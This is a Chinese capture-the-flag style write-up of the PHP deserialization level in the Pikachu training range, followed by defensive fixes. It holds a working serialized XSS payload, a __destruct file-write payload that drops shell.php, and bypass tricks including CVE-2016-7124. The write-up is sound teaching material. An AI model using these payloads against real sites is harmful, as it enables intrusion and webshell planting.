# PHP 反序列化漏洞 通关笔记

> 菜单里叫 **PHP反序列化漏洞**。
>
> 页面说「这是一个接受序列化数据的 api」。
>
> 那我们就给它一段"序列化字符串"——**里面的属性值，由我们说了算。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | PHP反序列化 → PHP反序列化漏洞 |
| 页面地址 | `http://pikachu/vul/unserilization/unser.php` |
| 提交方式 | POST |
| 参数名 | `o` |
| 目标 | 控制反序列化后的对象属性，制造 XSS |

---

## 二、我的解题步骤

### 步骤 1：先随便输点什么

输入 `hello`，提交。

页面提示：

```
大兄弟,来点劲爆点儿的!
```

**说明 `unserialize('hello')` 失败了。**

### 步骤 2：看源码，找到类定义

```php
class S{
    var $test = "pikachu";
    function __construct(){
        echo $this->test;
    }
}

$html='';
if(isset($_POST['o'])){
    $s = $_POST['o'];
    if(!@$unser = unserialize($s)){
        $html.="<p>大兄弟,来点劲爆点儿的!</p>";
    }else{
        $html.="<p>{$unser->test}</p>";   // ← 属性被原样输出
    }
}
```

两个关键：

1. **`unserialize($_POST['o'])`** —— 用户输入直接反序列化
2. **`{$unser->test}`** —— 对象的属性被**原样输出**到 HTML

**只要我们能控制 `test` 属性，就能注入。**

### 步骤 3：构造序列化字符串

先看正常对象序列化后是什么：

```php
var_dump(serialize(new S()));
// O:1:"S":1:{s:4:"test";s:7:"pikachu";}
```

格式拆解：

| 片段 | 含义 |
| --- | --- |
| `O:1:"S"` | 对象，类名长度 1，类名 `S` |
| `:1:` | 1 个属性 |
| `s:4:"test"` | 键名：字符串，长度 4，`test` |
| `s:7:"pikachu"` | 值：字符串，长度 7，`pikachu` |

把值换成 payload：

```
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

**注意 `s:29` —— 必须等于 payload 的字符数。**

```
<script>alert('xss')</script>
  8    +     12      +    9     = 29
```

### 步骤 4：提交

把整串粘进去，提交。

我实测的返回：

```html
<p><script>alert('xss')</script></p>
```

**`<script>` 没有被转义，弹窗。**

### 步骤 5：为什么 `__construct` 没执行

类里有个：

```php
function __construct(){
    echo $this->test;
}
```

但**反序列化不调用 `__construct`**（那是 `new` 的时候才调）。

所以输出完全来自这一行：

```php
$html.="<p>{$unser->test}</p>";
```

---

## 三、原理分析

### 3.1 完整链路

```
攻击者构造序列化字符串
        ↓
$_POST['o'] → unserialize()
        ↓
还原出一个 S 对象，test 属性 = <script>...
        ↓
$unser->test 被输出到 HTML
        ↓
XSS
```

### 3.2 序列化格式的"长度"是硬约束

```
s:29:"<script>alert('xss')</script>"
   ↑
   必须精确等于后面字符串的字节数
```

**长度算错，`unserialize` 直接返回 false**，页面就会显示"来点劲爆的"。

这是新手最容易失败的点。

### 3.3 为什么这也算"反序列化漏洞"

严格说，这一关没有"魔术方法执行代码"，只是"属性被控制"。

但它演示了反序列化漏洞的**本质**：

> **序列化字符串里的每一个值，都是攻击者可控的。**

在真实场景里，如果某个类的 `__destruct()` 里写了 `file_put_contents($this->file, $this->content)`，攻击者就能通过控制这两个属性**写任意文件**。

**这一关是"简化版"——把"危险函数"换成了"输出到页面"。**

---

## 四、知识点与笔记

### 4.1 各种类型的序列化格式

| 类型 | 格式 | 例子 |
| --- | --- | --- |
| 整数 | `i:值;` | `i:123;` |
| 浮点 | `d:值;` | `d:1.5;` |
| 字符串 | `s:长度:"值";` | `s:3:"abc";` |
| 布尔 | `b:0/1;` | `b:1;` |
| NULL | `N;` | `N;` |
| 数组 | `a:数量:{...}` | `a:2:{i:0;s:1:"a";i:1;s:1:"b";}` |
| 对象 | `O:类名长:"类名":属性数:{...}` | `O:1:"S":1:{s:4:"test";s:1:"a";}` |

### 4.2 长度必须精确

```php
echo strlen("<script>alert('xss')</script>");   // 29
```

**中文字符按字节算**：一个汉字在 UTF-8 下是 3 字节。

### 4.3 常见的绕过技巧

| 场景 | 技巧 |
| --- | --- |
| 长度过滤 | `s:4:"test"` 改成 `S:4:"test"`（大写 S 在某些版本等价） |
| 属性名过滤 | 用 `\0` 构造私有属性 |
| `__wakeup` 校验 | 属性个数改大（CVE-2016-7124） |
| 字符串过滤 | 用 `C:` 自定义序列化 |

**（这一关用不到，但面试常问。）**

### 4.4 真实漏洞长什么样

```php
class Logger {
    function __destruct() {
        file_put_contents($this->path, $this->data);
    }
}
```

payload：

```
O:6:"Logger":2:{s:4:"path";s:9:"shell.php";s:4:"data";s:18:"<?php phpinfo();?>";}
```

**对象一销毁，文件就写出来了。**

---

## 五、和其他几关的区别

| 关卡 | 危险函数 | 触发方式 |
| --- | --- | --- |
| **反序列化** | `unserialize()` | 魔术方法 |
| RCE eval | `eval()` | 直接执行 |
| 文件包含 | `include` | 包含文件 |
| XSS | 输出 | 浏览器解析 |

**反序列化是"间接"的——你要先找到一个"能执行代码的类"。**

---

## 六、防御怎么写

### 6.1 不要反序列化用户输入

```php
// 危险
$obj = unserialize($_POST['o']);

// 安全：用 JSON
$obj = json_decode($_POST['o']);
```

**`json_decode` 只还原数据，不还原对象，不触发魔术方法。**

### 6.2 白名单类

```php
$obj = unserialize($input, ['allowed_classes' => ['User', 'Order']]);
```

### 6.3 签名校验

```php
$data = base64_decode($_POST['data']);
[$payload, $sign] = explode('.', $data, 2);

if (hash_hmac('sha256', $payload, $secret) !== $sign) {
    exit('数据被篡改');
}
$obj = unserialize($payload);
```

**攻击者不知道密钥，改不了内容。**

### 6.4 输出转义（本关）

```php
echo htmlspecialchars($unser->test, ENT_QUOTES, 'UTF-8');
```

**这一条能修掉本关的 XSS，但修不掉反序列化本身。**

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 反序列化可以控制对象属性 |
| 关键代码 | `unserialize($_POST['o'])` + `{$unser->test}` |
| payload | `O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}` |
| 实测 | 页面输出未转义的 `<script>` |
| 难点 | 长度 `s:29` 必须精确 |
| 修复 | 不用 `unserialize` / 白名单 / 签名 |

**一句话**：

> **序列化字符串是"可读的"——你能读懂它，就能改它。**

---

## 参考

- [OWASP: Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [PHP: unserialize](https://www.php.net/manual/zh/function.unserialize.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
